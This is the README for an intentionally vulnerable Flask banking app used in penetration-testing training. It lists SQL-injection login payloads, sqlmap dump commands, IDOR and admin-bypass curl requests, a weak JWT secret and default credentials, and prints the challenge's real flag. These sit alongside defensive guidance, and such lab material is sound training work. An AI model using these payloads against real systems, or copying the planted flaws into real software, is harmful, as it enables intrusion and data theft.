# 🏦 Razz Bank - Advanced Multi-Vulnerability Training Platform
⚠️ **Educational Purpose Only**
This application is an advanced, intentionally vulnerable web banking application designed for cybersecurity training and penetration testing education. It contains multiple security vulnerabilities and is designed to teach security professionals how to identify and exploit common web application vulnerabilities.

🎯 Overview
Razz Bank is a comprehensive training platform that demonstrates multiple categories of web application vulnerabilities in a realistic banking environment. This enhanced version includes modern UI/UX design, JWT authentication, IDOR vulnerabilities, and a comprehensive API ecosystem.

🚨 Security Vulnerabilities Included
- SQL Injection (SQLi) - Vulnerable login forms and database queries
- Insecure Direct Object Reference (IDOR) - Unauthorized access to user profiles and account data
- JWT Authentication Bypass - Weak JWT implementation with predictable secrets
- Authorization Bypass - Admin panel access through URL parameters
- Information Disclosure - Exposed user data and system information

🏴 Flag Information
- Real Flag: Located in `system_flags` table - `RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}`
- Decoy Flags: 5+ fake flags scattered throughout the application
- Flag Format: All flags follow the pattern `RAZZ{...}`

🚀 Quick Setup & Deployment
### Method 1: Docker Compose (Recommended)
```bash
# Clone the repository
git clone https://github.com/KerberoSec/RAZZ_BANK.git
cd RAZZ_BANK

# Development environment (SQLite)
docker-compose --profile development up -d

# Production environment (PostgreSQL + Monitoring)
docker-compose --profile production up -d

# Access the application
open http://localhost:5000
```
### Method 2: Manual Setup
```bash
# Install dependencies
pip install -r requirements.txt

# Initialize database
python3 app.py

# Access the application
open http://localhost:5000
```
### Method 3: Kali Linux Quick Setup
```bash
# Install system dependencies
sudo apt update
sudo apt install python3-pip docker.io docker-compose -y

# Clone and run
git clone https://github.com/KerberoSec/RAZZ_BANK.git
cd RAZZ_BANK
chmod +x setup.sh run.sh
./run.sh
```

📁 Enhanced Project Structure
```
RAZZ_BANK/
├── app.py                      # Main Flask application with JWT & IDOR
├── requirements.txt            # Python dependencies (enhanced)
├── docker-compose.yml          # Multi-service Docker setup
├── DOCKER_SETUP.md            # Docker deployment guide
├── README.md                   # This documentation
│
├── templates/                  # Enhanced HTML templates
│   ├── base.html              # Modern responsive base template
│   ├── index.html             # Landing page
│   ├── login.html             # JWT-enabled login page
│   ├── register.html          # Registration page
│   ├── dashboard.html         # Enhanced dashboard with vulnerabilities
│   ├── statements.html        # Transaction statements
│   └── account_settings.html  # User account management
│
├── static/                    # Frontend assets
│   ├── css/
│   │   └── style.css         # Modern CSS with themes & animations
│   ├── js/
│   │   └── main.js           # Enhanced JavaScript with API integration
│   ├── sw.js                 # Service Worker for PWA
│   └── manifest.json         # PWA manifest
│
├── monitoring/                # Monitoring configuration
│   ├── prometheus.yml        # Metrics collection
│   └── grafana/              # Dashboard configurations
│   
├── nginx/                     # Reverse proxy configuration
├── haproxy/                   # Load balancer configuration
└── fluentd/                   # Log aggregation
```

🔍 Vulnerability Categories & Exploitation
### 1. SQL Injection (Primary Vulnerability)
- **Location**: Login form (`/login`)
- **Type**: Union-based SQL injection
- **Impact**: Authentication bypass, data exfiltration

#### Manual Exploitation:
```sql
-- Authentication bypass
Username: admin' OR '1'='1' --
Password: anything

-- Data extraction (flag retrieval)
Username: admin' UNION SELECT 1,2,3,flag_value,5,6,7,8 FROM system_flags--
Password: anything
```
#### SQLMap Exploitation:
```bash
# Basic enumeration
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin" --dbs

# Extract flag from system_flags table
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin" -D main -T system_flags --dump
```
### 2. Insecure Direct Object Reference (IDOR)
**Endpoints**:
- `/profile/<user_id>` - View any user's profile data
- `/account/<account_number>/transactions` - Access any account's transactions

#### Exploitation:
```bash
# Access admin profile
curl http://localhost:5000/profile/1057

# Access any account's transactions
curl http://localhost:5000/account/ADM001/transactions
```
### 3. JWT Authentication Vulnerabilities
**Issues**:
- Weak secret key: `weak_secret_key_2024`
- No key rotation
- Client-side storage in localStorage

#### Exploitation:
```bash
# Login with JWT
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123!@#"}'

# Decode JWT (weak secret allows offline cracking)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```
### 4. Authorization Bypass
- **Location**: Admin panel (`/admin/users`)
- **Method**: URL parameter manipulation

#### Exploitation:
```bash
# Bypass admin authorization
curl "http://localhost:5000/admin/users?admin=true"
```

🛠️ API Documentation
### Authentication Endpoints
| Method | Endpoint | Description |
|---|---|---|
| POST | `/api/auth/login` | JWT-based authentication |
| POST | `/api/auth/verify` | JWT token verification |

### Banking API Endpoints
| Method | Endpoint | Description | Authentication |
|---|---|---|---|
| GET | `/api/status` | API status and feature list | None |
| GET | `/api/transactions` | User transaction history | Session/JWT |
| POST | `/api/transfer` | Money transfer between accounts | Session/JWT |
| POST | `/api/pay-bill` | Bill payment processing | Session/JWT |
| POST | `/api/apply-loan` | Loan application submission | Session/JWT |
| GET | `/api/v1.0/account` | Account details retrieval (IDOR vulnerable) | None |

### Vulnerable Endpoints (Educational)
| Method | Endpoint | Vulnerability | Impact |
|---|---|---|---|
| GET | `/profile/<user_id>` | IDOR | Profile data exposure |
| GET | `/account/<account>/transactions` | IDOR | Transaction data exposure |
| GET | `/api/v1.0/account` | IDOR | Account data exposure with flag |
| GET | `/admin/users?admin=true` | AuthZ Bypass | Admin data access |
| POST | `/login` | SQL Injection | Authentication bypass |

🏗️ Architecture & Technologies
### Backend Stack
- **Framework**: Flask 3.1.2 with enhanced security (intentionally vulnerable)
- **Database**: SQLite (development) / PostgreSQL (production)
- **Authentication**: Session-based + JWT (dual authentication)
- **Caching**: Redis for session management
- **Security**: Intentionally vulnerable implementation

### Frontend Stack
- **UI Framework**: Modern CSS with CSS Variables and Grid/Flexbox
- **JavaScript**: Vanilla JS with modern ES6+ features
- **PWA**: Service Worker + Web App Manifest
- **Responsive Design**: Mobile-first approach
- **Accessibility**: WCAG 2.1 compliant structure

### Infrastructure
- **Containerization**: Docker + Docker Compose
- **Reverse Proxy**: Nginx with SSL termination
- **Load Balancing**: HAProxy for high availability
- **Monitoring**: Prometheus + Grafana
- **Logging**: Fluentd for log aggregation

🖥️ Enhanced Features
### Modern UI/UX
- **Dark/Light Theme**: Toggle-able theme system
- **Progressive Web App**: Installable on mobile devices
- **Responsive Design**: Optimized for all screen sizes
- **Accessibility**: Screen reader compatible
- **Animations**: Smooth transitions and micro-interactions

### Security Training Features
- **Vulnerability Demonstration Panel**: Interactive vulnerability testing
- **API Testing Interface**: Built-in API exploration tool
- **Real-time Vulnerability Detection**: Client-side security warnings
- **Educational Context**: Contextual security information

### Advanced Functionality
- **JWT Authentication**: Weak implementation for educational purposes
- **Session Management**: Redis-backed session storage
- **Real-time Updates**: WebSocket-ready architecture
- **Monitoring**: Comprehensive application monitoring

🐳 Docker Deployment Guide
### Development Profile
```bash
# Single container setup with SQLite
docker-compose --profile development up -d

# Access points:
# - Application: http://localhost:5001
# - Hot reload enabled for development
```
### Production Profile
```bash
# Full stack with PostgreSQL, Redis, monitoring
docker-compose --profile production up -d

# Access points:
# - Application: http://localhost:5000
# - Database Admin: http://localhost:8080
# - Grafana: http://localhost:3000
# - Prometheus: http://localhost:9090
# - HAProxy Stats: http://localhost:8082/stats
```
### Service Overview
| Service | Description | Port | Credentials |
|---|---|---|---|
| razz-bank-app | Main application | 5000 | admin/admin123!@# |
| postgres | Database server | 5432 | bank_user/secure_bank_password_2025 |
| redis | Session cache | 6379 | redis_secure_password_2025 |
| nginx | Reverse proxy | 80/443 | - |
| adminer | DB administration | 8080 | - |
| grafana | Monitoring dashboards | 3000 | admin/admin_grafana_2025 |
| prometheus | Metrics collection | 9090 | - |

🧪 Testing & Validation
### Automated Testing
```bash
# API endpoint testing
curl -s http://localhost:5000/api/status | jq

# Health checks
curl -s http://localhost:5000/health

# Vulnerability validation
curl -s "http://localhost:5000/admin/users?admin=true" | jq
```
### Manual Testing Checklist
- [ ] SQL injection in login form
- [ ] IDOR vulnerability in profile access
- [ ] JWT authentication flow
- [ ] Admin authorization bypass
- [ ] API endpoint accessibility
- [ ] PWA installation
- [ ] Responsive design on mobile
- [ ] Theme switching functionality

📚 Educational Learning Paths
### Beginner Path
1. **Reconnaissance** - Explore `/robots.txt`, `/sitemap.xml`
2. **SQL Injection** - Basic authentication bypass
3. **Flag Hunting** - Distinguish real vs. fake flags
4. **Documentation Review** - Understand application structure

### Intermediate Path
1. **Advanced SQLi** - Union-based data extraction
2. **IDOR Exploitation** - Unauthorized data access
3. **API Security** - JWT token analysis
4. **Authorization Testing** - Admin panel bypass

### Advanced Path
1. **Full Chain Exploitation** - Combine multiple vulnerabilities
2. **Custom Payload Development** - Create sophisticated attacks
3. **Defense Evasion** - Bypass security controls
4. **Report Writing** - Document findings professionally

🔧 Configuration & Customization
### Environment Variables
```bash
# Database configuration
DATABASE_URL=sqlite:///razz_bank.db  # or postgresql://...
REDIS_URL=redis://localhost:6379

# Application settings
FLASK_ENV=production
FLASK_DEBUG=false

# JWT configuration
JWT_SECRET=weak_secret_key_2024  # Intentionally weak
JWT_ALGORITHM=HS256
```
### Customization Options
- **Database Backend**: Switch between SQLite and PostgreSQL
- **Authentication Method**: Session-based vs JWT
- **Theme System**: Customize colors and styling
- **Vulnerability Levels**: Enable/disable specific vulnerabilities

🚨 Security Warnings
### ⚠️ IMPORTANT DISCLAIMERS
1. **Never deploy in production** - This application is intentionally vulnerable
2. **Educational use only** - For authorized security training purposes
3. **Isolated environment** - Deploy only in sandboxed/isolated networks
4. **Legal compliance** - Ensure proper authorization before testing
5. **Data protection** - Do not use real personal or financial data

### 🛡️ Defensive Measures (Educational Context)
The application demonstrates the following security anti-patterns:
- **Unparameterized queries** → Use prepared statements
- **Missing authorization checks** → Implement proper access controls
- **Weak cryptographic practices** → Use strong, rotated secrets
- **Information disclosure** → Minimize error message details
- **Insufficient input validation** → Implement comprehensive validation

🏆 Challenge Completion
### Success Criteria
✅ **Primary Objective**: Extract the real flag from `system_flags` table
✅ **Secondary Objectives**:
- Demonstrate IDOR vulnerability
- Exploit JWT authentication
- Bypass admin authorization
- Document all findings

### Flag Validation
- **Real Flag**: `RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}`
- **Location**: `system_flags` table → `flag_value` column
- **Method**: SQL injection via login form

📞 Support & Resources
### Troubleshooting
- **Port conflicts**: Use `docker-compose down` and check port availability
- **Database issues**: Reset with `rm razz_bank.db` and restart
- **Permission errors**: Check file permissions with `chmod +x setup.sh run.sh`

### Additional Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [JWT Security Best Practices](https://tools.ietf.org/html/rfc8725)
- [IDOR Prevention Guide](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

### Community
- **Report Issues**: GitHub Issues for bug reports
- **Contributions**: Pull requests for improvements
- **Discussions**: GitHub Discussions for questions

📄 License & Legal
This project is released under the MIT License for educational purposes.

**Legal Notice**: This software is designed for educational and authorized security testing purposes only. Users are responsible for ensuring compliance with applicable laws and regulations. The authors assume no liability for misuse of this software.

🎓 Created for Security Education by Razz Security
Use responsibly - Learn ethically - Secure the digital world
